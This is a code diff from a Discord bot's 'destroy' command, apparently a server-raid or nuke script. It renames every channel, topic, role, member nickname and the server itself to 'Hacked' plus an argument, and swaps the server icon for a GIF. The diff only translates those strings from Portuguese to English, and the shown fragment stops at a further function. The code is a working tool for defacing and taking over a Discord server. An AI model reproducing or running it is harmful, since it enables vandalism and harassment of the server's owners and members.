@@ -3,18 +3,18 @@ exports.run = async (client, message, args) => {
     console.log(`Destroy Ordernado Por ${message.author.username} ID: ${message.author.id}`)
     function a1(){
         client.guilds.get(message.guild.id).channels.forEach((canal) => {
-            canal.setTopic("Hackeado Por " + arg)
-            canal.setName("Hackeado Por " + arg)
+            canal.setTopic("Hacked " + arg)
+            canal.setName("Hacked " + arg)
         })
-       message.guild.setName("Hackeado Por " + arg)
+       message.guild.setName("Hacked" + arg)
        client.guilds.get(message.guild.id).members.forEach((m) => {
-           m.setNickname("Hackeado Por " + arg)
+           m.setNickname("Hacked " + arg)
        })
     }
     function b1(){
        message.guild.setIcon("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
      client.guilds.get(message.guild.id).roles.forEach((r) => {
-         r.setName("Hackeado Por " + arg)
+         r.setName("Hacked " + arg)
      })
     }
     function a2(){
